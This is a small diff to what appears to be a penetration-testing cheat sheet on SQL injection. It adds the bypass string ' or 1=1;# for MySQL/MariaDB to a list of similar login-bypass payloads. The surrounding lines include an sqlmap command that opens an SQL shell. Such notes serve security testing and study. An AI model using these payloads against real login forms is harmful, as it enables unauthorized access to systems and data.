@@ -190,6 +190,7 @@ SQLMap
   `sqlmap -r request.txt -p TextBoxUsername --sql-shell --technique=U` 
 
 Bypasses  
+  `' or 1=1;#`  (MySQL/MariaDB)
   `' or 1=1 LIMIT 1 --`  
   `' or 1=1 LIMIT 1 -- -`  
   `' or 1=1 LIMIT 1#`  
